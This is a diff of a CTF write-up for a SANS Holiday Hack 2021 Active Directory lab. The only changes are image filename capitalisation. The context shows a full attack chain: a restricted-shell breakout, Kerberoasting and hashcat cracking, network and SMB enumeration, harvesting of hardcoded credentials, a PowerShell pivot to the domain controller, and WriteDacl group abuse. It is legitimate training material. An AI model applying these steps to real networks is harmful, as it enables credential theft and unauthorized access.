@@ -24,13 +24,13 @@ The talk the Chris Davis hosted is extremely helpful for this challenge. The tal
 
 To start, all we are given is registration portal for [Elf University](https://register.elfu.org/). Let's make an account.
 
-![Elfu Registration Page](/assets/img/2021_sans_hhc/obj/obj08/picture_1.png){: width="750"}
+![Elfu Registration Page](/assets/img/2021_sans_hhc/obj/obj08/picture_1.PNG){: width="750"}
 <p align="center"><strong>Figure 1: Elfu Registraion Landing Page</strong></p>
 
 
 After creating an account, we are given a set of credentials and instructions on how to access the grading system.
 
-![Elfu Registration Confirmation](/assets/img/2021_sans_hhc/obj/obj08/picture_2.png){: width="750"}
+![Elfu Registration Confirmation](/assets/img/2021_sans_hhc/obj/obj08/picture_2.PNG){: width="750"}
 <p align="center">
     <strong>Figure 2: Elfu Registration Confirmation and Credentials</strong><br>
     Your credentials will be different.
@@ -47,7 +47,7 @@ ElfU Domain Password: Bjfawoxod#
 
 When we ssh in to the grading portal, we are immediately met with the grading applicaiton.
 
-![Elfu Grading Shell](/assets/img/2021_sans_hhc/obj/obj08/picture_3.png){: width="750"}
+![Elfu Grading Shell](/assets/img/2021_sans_hhc/obj/obj08/picture_3.PNG){: width="750"}
 <p align="center">
     <strong>Figure 3: Elfu Grading Service</strong>
 </p>
@@ -55,7 +55,7 @@ When we ssh in to the grading portal, we are immediately met with the grading ap
 Let's see if we can break out of the shell. Regular escape techniques won't work here, but we can try to background the program somehow with `Ctrl + <letter>`.
 After a few different tries, it looks like `Ctrl+d` is the magic letter to get us to a python shell. In my case, I did 
 
-![Python CLI](/assets/img/2021_sans_hhc/obj/obj08/picture_4.png){: width="750"}
+![Python CLI](/assets/img/2021_sans_hhc/obj/obj08/picture_4.PNG){: width="750"}
 <p align="center">
     <strong>Figure 4: Python Command Line Interface</strong><br>
     We've broken our of the intended grading shell. We should be able to run python commands in here now.
@@ -70,7 +70,7 @@ import os
 os.system("/bin/bash")
 ```
 
-![Bash Shell](/assets/img/2021_sans_hhc/obj/obj08/picture_5.png){: width="750"}
+![Bash Shell](/assets/img/2021_sans_hhc/obj/obj08/picture_5.PNG){: width="750"}
 <p align="center">
     <strong>Figure 5: Bash Shell on Grading Server</strong><br>
     We got a bash shell!
@@ -91,7 +91,7 @@ $ sudo -l
 $ ip addr
 ```
 
-![Initial Foothold Enumeration](/assets/img/2021_sans_hhc/obj/obj08/picture_6.png){: width="750"}
+![Initial Foothold Enumeration](/assets/img/2021_sans_hhc/obj/obj08/picture_6.PNG){: width="750"}
 <p align="center">
     <strong>Figure 6: Initial Enumeration of Grade Server</strong>
 </p>
@@ -108,7 +108,7 @@ Let's ping the domain and see what comes back
 $ ping -c4 elfu.local
 ```
 
-![Finding the Domain Controller](/assets/img/2021_sans_hhc/obj/obj08/picture_7.png){: width="750"}
+![Finding the Domain Controller](/assets/img/2021_sans_hhc/obj/obj08/picture_7.PNG){: width="750"}
 <p align="center">
     <strong>Figure 7: Domain Controller Found</strong>
 </p>
@@ -138,7 +138,7 @@ python3 GetUserSPNs.py -dc-ip 10.128.1.53 elfu.local/<username>:<domain password
 
 Looks like we found a vulnerable account, `elfu_svc`!
 
-![Kerberoasting the elfu_svc Account](/assets/img/2021_sans_hhc/obj/obj08/picture_8.png){: width="750"}
+![Kerberoasting the elfu_svc Account](/assets/img/2021_sans_hhc/obj/obj08/picture_8.PNG){: width="750"}
 <p align="center">
     <strong>Figure 8: Service Account Vulnerable to Kerberoasting</strong>
 </p>
@@ -194,7 +194,7 @@ Let's get to crackin'!
 hashcat -a 0 -m 13100 crackMe.txt --potfile-disable -r /usr/share/hashcat/rules/
 password_cracking_rules/OneRuleToRuleThemAll.rule --force -O -w 4 ./wordlist.txt
 ```
-![elfu_svc Credentials](/assets/img/2021_sans_hhc/obj/obj08/picture_9.png){: width="750"}
+![elfu_svc Credentials](/assets/img/2021_sans_hhc/obj/obj08/picture_9.PNG){: width="750"}
 <p align="center">
     <strong>Figure 9: Cracked Credentials for the <em>elfu_svc</em> Account</strong>
 </p>
@@ -216,7 +216,7 @@ Let's see what other hosts are around us in this subnet. We can do this by creat
 for i in {1..254}; do (ping -c1 172.17.0.$i | grep "bytes from" &); done
 ```
 
-![Network Ping Sweep](/assets/img/2021_sans_hhc/obj/obj08/picture_10.png){: width="750"}
+![Network Ping Sweep](/assets/img/2021_sans_hhc/obj/obj08/picture_10.PNG){: width="750"}
 <p align="center">
     <strong>Figure 10: Host Enumeration</strong>
 </p>
@@ -246,7 +246,7 @@ nmap -sV -p- -Pn 172.17.0.1,2,3,4,5
 #       We already know that they are up with our initial ping sweep
 ```
 
-![Service Enumeration](/assets/img/2021_sans_hhc/obj/obj08/picture_11.png){: width="750"}
+![Service Enumeration](/assets/img/2021_sans_hhc/obj/obj08/picture_11.PNG){: width="750"}
 <p align="center">
     <strong>Figure 11: Service Scan of Discovered Hosts</strong>
 </p>
@@ -261,7 +261,7 @@ smbclient -L \\172.17.0.4
 smbclient -L \\172.17.0.5
 ```
 
-![SMB Share Enumeration](/assets/img/2021_sans_hhc/obj/obj08/picture_12.png){: width="750"}
+![SMB Share Enumeration](/assets/img/2021_sans_hhc/obj/obj08/picture_12.PNG){: width="750"}
 <p align="center">
     <strong>Figure 12: Enumerated Shares of Hosts <em>172.17.0.3</em>, <em>172.17.0.4</em>, and <em>172.17.0.5</em></strong>
 </p>
@@ -274,7 +274,7 @@ But before we go treasure hunting, let's see if the `elfu_svc` account has acces
 smbclient \\\\172.17.0.4\\research_dep -U elfu_svc
 ```
 
-![Attempted Access of Target Directory](/assets/img/2021_sans_hhc/obj/obj08/picture_13.png){: width="750"}
+![Attempted Access of Target Directory](/assets/img/2021_sans_hhc/obj/obj08/picture_13.PNG){: width="750"}
 <p align="center">
     <strong>Figure 13: Attempt to Access Research Share</strong>
 </p>
@@ -287,7 +287,7 @@ smbclient \\\\172.17.0.4\\elfu_svc_shr -U elfu_svc
 
 Success! It looks like we have access to the share and there are a ton of scripts that live on this share. Taking hint 6, let's see if we can find some stored credentials.
 
-![Attempted Access of Service Share](/assets/img/2021_sans_hhc/obj/obj08/picture_14.png){: width="750"}
+![Attempted Access of Service Share](/assets/img/2021_sans_hhc/obj/obj08/picture_14.PNG){: width="750"}
 <p align="center">
     <strong>Figure 14: Successful Access of Service Share</strong>
 </p>
@@ -301,7 +301,7 @@ smb: \> prompt OFF
 smb: \> mget *
 ```
 
-![File Exfiltration](/assets/img/2021_sans_hhc/obj/obj08/picture_15.png){: width="750"}
+![File Exfiltration](/assets/img/2021_sans_hhc/obj/obj08/picture_15.PNG){: width="750"}
 <p align="center">
     <strong>Figure 15: Exfiltration of Scripts from Service Share</strong>
 </p>
@@ -312,14 +312,14 @@ Since this is `elfu`, let's grep for the keyword `elf` in all the files
 grep --ignore-case elf *
 ```
 
-![Keyword Search for Stored Credentials](/assets/img/2021_sans_hhc/obj/obj08/picture_16.png){: width="750"}
+![Keyword Search for Stored Credentials](/assets/img/2021_sans_hhc/obj/obj08/picture_16.PNG){: width="750"}
 <p align="center">
     <strong>Figure 16: Enumeration of Stored Credentials from Service Share Scripts</strong>
 </p>
 
 The second entry, `GetProcessInfo.ps1`, looks like it has an account of interest, as well as some stored credentials that we could possible work with.
 
-![](/assets/img/2021_sans_hhc/obj/obj08/picture_17.png){: width="750"}
+![](/assets/img/2021_sans_hhc/obj/obj08/picture_17.PNG){: width="750"}
 <p align="center">
     <strong>Figure 17: Stored Credentials of <em>remote_elf</em> Account</strong>
 </p>
@@ -332,7 +332,7 @@ With our new found credentials, we can enter a `powershell` commandline prompt o
 
 Luckily, the grading host has `powershell` installed on it
 
-![Powershell](/assets/img/2021_sans_hhc/obj/obj08/picture_18.png){: width="750"}
+![Powershell](/assets/img/2021_sans_hhc/obj/obj08/picture_18.PNG){: width="750"}
 <p align="center">
     <strong>Figure 18: Powershell Exists on the Grading Server</strong><br>
     We can use this fact to our advantage and run powershell commands in a hybrid domain environment
@@ -340,7 +340,7 @@ Luckily, the grading host has `powershell` installed on it
 
 We can store the credentials in a variable in this shell just like the script does by copying and pasting the first three lines of the script in to the powershell prompt we have invoked
 
-![Storing Enumerating Credentials as Variables in Powershell](/assets/img/2021_sans_hhc/obj/obj08/picture_19.png){: width="750"}
+![Storing Enumerating Credentials as Variables in Powershell](/assets/img/2021_sans_hhc/obj/obj08/picture_19.PNG){: width="750"}
 <p align="center">
     <strong>Figure 18: Storing Enumerated Credentials as Variables in Powershell</strong>
 </p>
@@ -353,7 +353,7 @@ PS > Enter-PSSession -ComputerName 10.128.1.53 -Credential $aCred -Authenticatio
 
 And we're are in what appears to be `DC01`!
 
-![Successful Pivot on to Domain Controller](/assets/img/2021_sans_hhc/obj/obj08/picture_20.png){: width="750"}
+![Successful Pivot on to Domain Controller](/assets/img/2021_sans_hhc/obj/obj08/picture_20.PNG){: width="750"}
 <p align="center">
     <strong>Figure 20: Successful Pivot on to Domain Controller</strong>
 </p>
@@ -364,7 +364,7 @@ So the goal of the challenge is to retrieve a research file. Presumably, there i
 
 Running `Get-ADGroup -Filter *`, we see that there is in fact a research group named `Research Department`
 
-![Enumeration of the Research Department Group](/assets/img/2021_sans_hhc/obj/obj08/picture_21.png){: width="750"}
+![Enumeration of the Research Department Group](/assets/img/2021_sans_hhc/obj/obj08/picture_21.PNG){: width="750"}
 <p align="center">
     <strong>Figure 21: Enumeration of the <em>Research Department</em> Group</strong>
 </p>
@@ -383,7 +383,7 @@ This will push out who has permissions to what in the group.
 
 Scrolling up a bit, we can see that `remote_elf` has WriteDacl permissions to this group. This means we can add our unprivileged user account to the group to access the `research_dep` share!
 
-![*remote_elf* WriteDacl Permissions to Research Department](/assets/img/2021_sans_hhc/obj/obj08/picture_22.png){: width="750"}
+![*remote_elf* WriteDacl Permissions to Research Department](/assets/img/2021_sans_hhc/obj/obj08/picture_22.PNG){: width="750"}
 <p align="center">
     <strong>Figure 21: <em>remote_elf WriteDacl</em> Permissions to <em>Research Department</em> Group</strong>
 </p>
@@ -445,7 +445,7 @@ Get-ADPrincipalGroupMembership etucdegcur | select name
 
 And now we should have access to the share!
 
-![Unprivileged User is Now a Member of the Research Department](/assets/img/2021_sans_hhc/obj/obj08/picture_23.png){: width="750"}
+![Unprivileged User is Now a Member of the Research Department](/assets/img/2021_sans_hhc/obj/obj08/picture_23.PNG){: width="750"}
 <p align="center">
     <strong>Figure 23: Unprivileged user is Now a Member of the <em>Research Department</em></strong>
 </p>
@@ -454,7 +454,7 @@ And now we should have access to the share!
 
 Now that we are added to the `Research Department` group, let's try to access the `research_dep` share with our unprivileged user account.
 
-![Successful Access to Research Share](/assets/img/2021_sans_hhc/obj/obj08/picture_24.png){: width="750"}
+![Successful Access to Research Share](/assets/img/2021_sans_hhc/obj/obj08/picture_24.PNG){: width="750"}
 <p align="center">
     <strong>Figure 24: Successful Access to Research Share</strong>
 </p>
@@ -471,7 +471,7 @@ scp -P 2222 . etucdegcur@grades.elfu.org:~/SantaSecretToAWonderfulHolidaySeason.
 
 It looks like the first ingredient it `Kindness`!
 
-![Target Document](/assets/img/2021_sans_hhc/obj/obj08/picture_25.png){: width="750"}
+![Target Document](/assets/img/2021_sans_hhc/obj/obj08/picture_25.PNG){: width="750"}
 <p align="center">
     <strong>Figure 25: Santa's Recipe to a Wonderful Holiday Season</strong>
 </p>
